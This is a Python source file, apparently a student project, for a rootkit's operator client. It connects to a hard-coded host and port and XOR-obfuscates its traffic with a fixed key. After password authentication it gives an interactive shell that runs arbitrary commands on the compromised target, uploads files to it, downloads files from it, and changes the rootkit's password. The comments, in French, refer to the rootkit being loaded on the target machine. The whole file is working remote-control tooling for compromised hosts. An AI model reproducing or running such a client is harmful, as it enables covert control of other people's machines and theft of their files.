import socket
import getpass
import os
import sys
import time

SERVER_IP = "192.168.15.5"
PORT = 4242
KEY = b"epita"
def xor(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def send(sock, text):
    encrypted = xor(text.encode(), KEY)
    sock.sendall(encrypted)

def recv(sock):
    data = b""
    start_time = time.time()
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                if not data:  # Si on n'a reçu aucune donnée
                    print("[-] Aucune réponse reçue du serveur")
                break
            data += chunk
            if len(chunk) < 4096:
                break
            if time.time() - start_time > 5:  # timeout après 5 secondes
                print("[-] Timeout en attente de la réponse complète")
                break
        if data:
            decrypted = xor(data, KEY).decode(errors="ignore")
            print(f"[DEBUG] Réponse reçue (chiffrée): {data}")
            print(f"[DEBUG] Réponse déchiffrée: {decrypted}")
            return decrypted
        return ""
    except socket.timeout:
        print("[-] Timeout en attente de la réponse du serveur")
        return ""
    except Exception as e:
        print(f"[-] Erreur lors de la réception: {e}")
        return ""

def upload_file(sock, local_path, remote_path):
    if not os.path.exists(local_path):
        print(f"[-] Fichier {local_path} non trouvé")
        return False

    with open(local_path, 'rb') as f:
        data = f.read()
        size = len(data)
        command = f"upload {remote_path} {size}"
        send(sock, command)
        time.sleep(0.1)  # On attend que le rootkit soit prêt
        sock.sendall(data)
        response = recv(sock)
        print(response)
        return "success" in response.lower()

def download_file(sock, remote_path, local_path):
    command = f"download {remote_path}"
    send(sock, command)
    
    with open(local_path, 'wb') as f:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            f.write(data)
    
    print(f"[+] Fichier téléchargé: {local_path}")
    return True

def change_password(sock, new_password):
    command = f"auth change {new_password}"
    send(sock, command)
    response = recv(sock)
    print(response)
    return "success" in response.lower()

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(10)  # 5 secondes de timeout

        try:
            s.connect((SERVER_IP, PORT))
            print(f"[+] Connecté à {SERVER_IP}:{PORT}")
        except ConnectionRefusedError:
            print(f"[-] Connexion refusée à {SERVER_IP}:{PORT}")
            print("[-] Vérifiez que le rootkit est bien chargé sur la machine cible")
            return
        except socket.timeout:
            print(f"[-] Timeout lors de la connexion à {SERVER_IP}:{PORT}")
            return

        # Authentification
        password = getpass.getpass("Mot de passe: ")
        print("[DEBUG] Envoi de la commande d'authentification...")
        send(s, f"auth {password}")
        print("[DEBUG] Attente de la réponse du serveur...")
        response = recv(s)

        if not response:
            print("[-] Pas de réponse du serveur après l'authentification")
            return
        if response.strip() != "OK":
            print(f"[-] Authentification échouée. Réponse: {response}")
            return

        print("[+] Authentifié.")

        while True:
            try:
                cmd = input("$ ")
                if cmd.strip().lower() in ("exit", "quit"):
                    break
                elif cmd.startswith("upload "):
                    # Format: upload local_path remote_path
                    try:
                        _, local_path, remote_path = cmd.split()
                        upload_file(s, local_path, remote_path)
                    except ValueError:
                        print("Usage: upload local_path remote_path")
                elif cmd.startswith("download "):
                    # Format: download remote_path local_path
                    try:
                        _, remote_path, local_path = cmd.split()
                        download_file(s, remote_path, local_path)
                    except ValueError:
                        print("Usage: download remote_path local_path")
                elif cmd.startswith("passwd "):
                    # Format: passwd new_password
                    try:
                        _, new_password = cmd.split()
                        change_password(s, new_password)
                    except ValueError:
                        print("Usage: passwd new_password")
                else:
                    send(s, f"exec {cmd}")
                    output = recv(s)
                    print(output)
            except socket.timeout:
                print("[-] Timeout lors de l'exécution de la commande")
                print("[-] Vérifiez la connexion au serveur")
                break

if __name__ == "__main__":
    main()
